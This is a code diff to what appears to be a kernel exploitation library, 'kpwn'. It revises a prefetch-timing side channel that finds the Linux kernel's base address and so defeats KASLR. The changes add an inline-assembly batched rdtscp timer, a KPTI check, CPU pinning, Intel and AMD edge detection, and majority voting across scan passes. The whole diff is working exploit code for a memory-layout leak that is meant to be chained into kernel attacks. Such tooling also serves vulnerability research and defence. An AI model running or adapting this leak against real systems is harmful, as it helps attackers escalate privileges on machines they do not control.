@@ -1,137 +1,119 @@
+#define _GNU_SOURCE
+#include "prefetch_scan.h"
+#include <cpuid.h>
+#include <errno.h>
 #include <kpwn/logger.h>
 #include <kpwn/utils.h>
 #include <kpwn/x86_64/side_channel.h>
+#include <sched.h>
 #include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
-#include <sys/syscall.h>
 #include <unistd.h>
-
-#define KERNEL_TEXT_MIN 0xffffffff80000000ull
-#define KERNEL_TEXT_MAX 0xffffffffc0000000ull
-#define KASLR_ALIGN 0x200000ull
-#define NUM_SLOTS ((KERNEL_TEXT_MAX - KERNEL_TEXT_MIN) / KASLR_ALIGN)
 
 #define WARMUP_ITERATIONS 3
 #define MEASURE_ITERATIONS 64
 #define CONFIRM_PASSES 7
+#define BATCH_ITERATIONS 10
+#define BATCH_PASSES 5
+#define BATCH_SIZE 2000
 
-#define AMD_CONFIRM_K 5
-#define AMD_CONFIRM_M 8
-
-static int cmp_u64(const void *a, const void *b) {
-  uint64_t va = *(const uint64_t *)a;
-  uint64_t vb = *(const uint64_t *)b;
-  return (va > vb) - (va < vb);
-}
-
-static void warm_tlb(void) { syscall(SYS_getgid); }
-
-static void collect_timings(uint64_t *times) {
+static void collect_timings(uint64_t *times, enum side_channel_arch arch) {
+  int amd = arch == x86_64_amd;
+  for (size_t idx = 0; idx < PREFETCH_SLOTS; idx++)
+    times[idx] = amd ? 0 : UINT64_MAX;
   for (int pass = 0; pass < WARMUP_ITERATIONS + MEASURE_ITERATIONS; pass++) {
-    for (size_t idx = 0; idx < NUM_SLOTS; idx++) {
-      uint64_t addr = KERNEL_TEXT_MIN + idx * KASLR_ALIGN;
-      warm_tlb();
+    for (size_t idx = 0; idx < PREFETCH_SLOTS; idx++) {
+      uint64_t addr = PREFETCH_TEXT_MIN + idx * PREFETCH_ALIGN;
       uint64_t t = measure_prefetch((void *)addr);
-      if (pass >= WARMUP_ITERATIONS)
+      if (pass < WARMUP_ITERATIONS)
+        continue;
+      if (amd)
         times[idx] += t;
+      else if (t < times[idx])
+        times[idx] = t;
     }
   }
-  for (size_t idx = 0; idx < NUM_SLOTS; idx++)
-    times[idx] /= MEASURE_ITERATIONS;
 }
 
-// Intel: mapped page = LOWER latency. On newer CPUs (Arrow Lake+) the delta
-// is small (~5 cycles) so a global-minimum search picks up entry trampoline
-// spikes instead of kbase. Use a falling-edge detector: find the first
-// sustained drop below a threshold derived from the median of all slots.
-static size_t find_base_intel(const uint64_t *times) {
-  uint64_t sorted[NUM_SLOTS];
-  memcpy(sorted, times, sizeof(sorted));
-  qsort(sorted, NUM_SLOTS, sizeof(uint64_t), cmp_u64);
-
-  uint64_t median = sorted[NUM_SLOTS / 2];
-  // Threshold: anything below 95% of median is "low" (mapped)
-  uint64_t threshold = median - median / 20;
-
-  log_debug("[kpwn:kaslr] intel median=%lu threshold=%lu", median, threshold);
-
-  // Skip any initial low-latency region
-  size_t start = 0;
-  while (start < NUM_SLOTS && times[start] <= threshold)
-    start++;
-
-  // Find the high→low falling edge (unmapped → mapped transition)
-  for (size_t idx = start; idx < NUM_SLOTS; idx++) {
-    if (times[idx] > threshold)
-      continue;
-    // idx is low-latency; confirm sustained run
-    if (idx + AMD_CONFIRM_M > NUM_SLOTS)
-      break;
-    int count = 0;
-    for (size_t j = 0; j < AMD_CONFIRM_M; j++) {
-      if (times[idx + j] <= threshold)
-        count++;
-    }
-    if (count >= AMD_CONFIRM_K)
-      return KERNEL_TEXT_MIN + idx * KASLR_ALIGN;
-  }
-
-  // Fallback: global minimum (classic EntryBleed behavior)
-  uint64_t min_time = UINT64_MAX;
-  size_t best = 0;
-  for (size_t i = 0; i < NUM_SLOTS; i++) {
-    if (times[i] < min_time) {
-      min_time = times[i];
-      best = i;
-    }
-  }
-  log_debug("[kpwn:kaslr] intel edge detection failed, fallback min slot=%zu",
-            best);
-  return KERNEL_TEXT_MIN + best * KASLR_ALIGN;
+// Batched timer adapted from KASLD's prefetch_scan_time_batch; see
+// prefetch_scan.h and LICENSES/KASLD-MIT.txt for provenance and license.
+static uint64_t measure_prefetch_batch(uint64_t addr) {
+  uint64_t t0_lo, t0_hi, t1_lo, t1_hi;
+  unsigned long batch = BATCH_SIZE;
+  __asm__ volatile("mfence\n\t"
+                   "rdtscp\n\t"
+                   "movq %%rax, %0\n\t"
+                   "movq %%rdx, %1\n\t"
+                   "lfence\n\t"
+                   "1:\n\t"
+                   "prefetchnta (%5)\n\t"
+                   "prefetcht2 (%5)\n\t"
+                   "decq %4\n\t"
+                   "jnz 1b\n\t"
+                   "lfence\n\t"
+                   "rdtscp\n\t"
+                   "movq %%rax, %2\n\t"
+                   "movq %%rdx, %3\n\t"
+                   "mfence"
+                   : "=&r"(t0_lo), "=&r"(t0_hi), "=&r"(t1_lo), "=&r"(t1_hi),
+                     "+r"(batch)
+                   : "r"(addr)
+                   : "rax", "rcx", "rdx", "cc", "memory");
+  return ((t1_hi << 32) | t1_lo) - ((t0_hi << 32) | t0_lo);
 }
 
-// AMD: mapped page = HIGHER latency (inverted vs Intel).
-// The kernel text region shows as a band of high-latency slots surrounded by
-// low-latency unmapped slots. We detect the LOW→HIGH rising edge: find the
-// first slot where timing jumps from below threshold to above, skipping any
-// initial high-latency region at the scan start (other kernel mappings).
-static size_t find_base_amd(const uint64_t *times) {
-  uint64_t sorted[NUM_SLOTS];
-  memcpy(sorted, times, sizeof(sorted));
-  qsort(sorted, NUM_SLOTS, sizeof(uint64_t), cmp_u64);
-
-  uint64_t median = sorted[NUM_SLOTS / 2];
-  uint64_t threshold = median + median / 2;
-
-  log_debug("[kpwn:kaslr] amd median=%lu threshold=%lu", median, threshold);
-
-  // Skip any initial high-latency region (pre-text kernel mappings)
-  size_t start = 0;
-  while (start < NUM_SLOTS && times[start] > threshold)
-    start++;
-
-  // Find the low→high rising edge: scan for a low-latency slot followed by
-  // a confirmed band of high-latency slots. The kbase is the last low-latency
-  // slot before the high band (the text mapping starts at kbase but the first
-  // prefetch-distinguishable page is kbase + KASLR_ALIGN).
-  size_t last_low = start;
-  for (size_t idx = start; idx < NUM_SLOTS; idx++) {
-    if (times[idx] <= threshold) {
-      last_low = idx;
-      continue;
+static void collect_timings_batched(uint64_t *times) {
+  for (size_t idx = 0; idx < PREFETCH_SLOTS; idx++) {
+    uint64_t addr = PREFETCH_TEXT_MIN + idx * PREFETCH_ALIGN;
+    times[idx] = UINT64_MAX;
+    // Consecutive trials prevent periodic stalls from affecting a whole band.
+    for (int pass = 0; pass < WARMUP_ITERATIONS + BATCH_ITERATIONS; pass++) {
+      uint64_t t = measure_prefetch_batch(addr);
+      if (pass >= WARMUP_ITERATIONS && t < times[idx])
+        times[idx] = t;
     }
-    // idx is high-latency; confirm it's a real band, not a spike
-    if (idx + AMD_CONFIRM_M > NUM_SLOTS)
-      break;
-    int count = 0;
-    for (size_t j = 0; j < AMD_CONFIRM_M; j++) {
-      if (times[idx + j] > threshold)
-        count++;
-    }
-    if (count >= AMD_CONFIRM_K)
-      return KERNEL_TEXT_MIN + last_low * KASLR_ALIGN;
   }
+}
+
+static size_t scan_prefetch(enum side_channel_arch arch, int batched) {
+  uint64_t times[PREFETCH_SLOTS];
+  size_t results[CONFIRM_PASSES] = {0};
+  int max_passes = batched ? BATCH_PASSES : CONFIRM_PASSES;
+  for (int pass = 0; pass < max_passes; pass++) {
+    if (batched)
+      collect_timings_batched(times);
+    else
+      collect_timings(times, arch);
+
+    results[pass] = arch == x86_64_amd ? prefetch_find_base_amd(times, batched)
+                                       : prefetch_find_base_intel(times);
+    log_debug("[kpwn:kaslr] %s pass %d/%d result=0x%lx",
+              batched ? "batch" : "single", pass + 1, max_passes,
+              results[pass]);
+    if (batched && results[pass]) {
+      int votes = 0;
+      for (int i = 0; i <= pass; i++)
+        if (results[i] == results[pass])
+          votes++;
+      // Require a majority of the full budget, even when exiting early.
+      if (votes > max_passes / 2) {
+        log_success("[kpwn:kaslr] batch kbase=0x%lx votes=%d/%d", results[pass],
+                    votes, max_passes);
+        return results[pass];
+      }
+    }
+  }
+
+  struct count_sort_data majority =
+      count_sort((const uint64_t *)results, max_passes);
+  if (majority.counter > (size_t)max_passes / 2 && majority.data != 0) {
+    log_success("[kpwn:kaslr] prefetch kbase=0x%lx votes=%zu/%d", majority.data,
+                majority.counter, max_passes);
+    return majority.data;
+  }
+  log_warn("[kpwn:kaslr] prefetch inconclusive (best=0x%lx votes=%zu/%d)",
+           majority.data, majority.counter, max_passes);
   return 0;
 }
 
@@ -139,47 +121,55 @@ static size_t find_base_amd(const uint64_t *times) {
 
 size_t kasld_prefetch() {
   enum side_channel_arch arch = get_arch();
-
-  uint64_t *times = calloc(NUM_SLOTS, sizeof(uint64_t));
-  ASSERT(times != NULL);
-
-  size_t results[CONFIRM_PASSES];
-
-  for (int pass = 0; pass < CONFIRM_PASSES; pass++) {
-    memset(times, 0, NUM_SLOTS * sizeof(uint64_t));
-    collect_timings(times);
-
-    switch (arch) {
-    case x86_64_intel:
-      results[pass] = find_base_intel(times);
-      break;
-    case x86_64_amd:
-      results[pass] = find_base_amd(times);
-      break;
-    default:
-      log_error("[kpwn:kaslr] unsupported arch for prefetch");
-      free(times);
-      return 0;
-    }
-
-    log_debug("[kpwn:kaslr] pass %d/%d result=0x%lx", pass + 1, CONFIRM_PASSES,
-              results[pass]);
+  if (arch != x86_64_intel && arch != x86_64_amd) {
+    log_error("[kpwn:kaslr] unsupported arch for prefetch");
+    return 0;
+  }
+  unsigned a, b, c, d;
+  if (!__get_cpuid(0x80000001, &a, &b, &c, &d) || !(d & (1u << 27))) {
+    log_warn("[kpwn:kaslr] RDTSCP is not supported");
+    return 0;
+  }
+  char *cpuinfo = slurp_file("/proc/cpuinfo", 1 << 16);
+  int pti = prefetch_kpti_flag(cpuinfo);
+  free(cpuinfo);
+  if (pti != 0) {
+    log_warn("[kpwn:kaslr] %s; skipping prefetch",
+             pti > 0 ? "KPTI is enabled" : "cannot determine KPTI status");
+    return 0;
   }
 
-  free(times);
-
-  struct count_sort_data majority =
-      count_sort((const uint64_t *)results, CONFIRM_PASSES);
-
-  if (majority.counter > CONFIRM_PASSES / 2 && majority.data != 0) {
-    log_success("[kpwn:kaslr] prefetch kbase=0x%lx votes=%zu/%d", majority.data,
-                majority.counter, CONFIRM_PASSES);
-    return majority.data;
+  cpu_set_t saved, pinned;
+  if (sched_getaffinity(0, sizeof(saved), &saved) != 0) {
+    log_warn("[kpwn:kaslr] cannot read CPU affinity: %s", strerror(errno));
+    return 0;
+  }
+  int cpu = sched_getcpu();
+  if (cpu < 0 || cpu >= CPU_SETSIZE || !CPU_ISSET(cpu, &saved)) {
+    for (cpu = 0; cpu < CPU_SETSIZE && !CPU_ISSET(cpu, &saved); cpu++)
+      ;
+  }
+  if (cpu == CPU_SETSIZE) {
+    log_warn("[kpwn:kaslr] no CPU available for prefetch");
+    return 0;
+  }
+  CPU_ZERO(&pinned);
+  CPU_SET(cpu, &pinned);
+  if (sched_setaffinity(0, sizeof(pinned), &pinned) != 0) {
+    log_warn("[kpwn:kaslr] cannot pin CPU: %s", strerror(errno));
+    return 0;
   }
 
-  log_warn("[kpwn:kaslr] prefetch inconclusive (best=0x%lx votes=%zu/%d)",
-           majority.data, majority.counter, CONFIRM_PASSES);
-  return 0;
+  size_t base = scan_prefetch(arch, 0);
+  if (!base && arch == x86_64_amd) {
+    log_debug("[kpwn:kaslr] retrying AMD with batched prefetch");
+    base = scan_prefetch(arch, 1);
+  }
+  if (sched_setaffinity(0, sizeof(saved), &saved) != 0) {
+    log_warn("[kpwn:kaslr] cannot restore CPU affinity: %s", strerror(errno));
+    return 0;
+  }
+  return base;
 }
 
 size_t kasld_proc_kallsyms() {
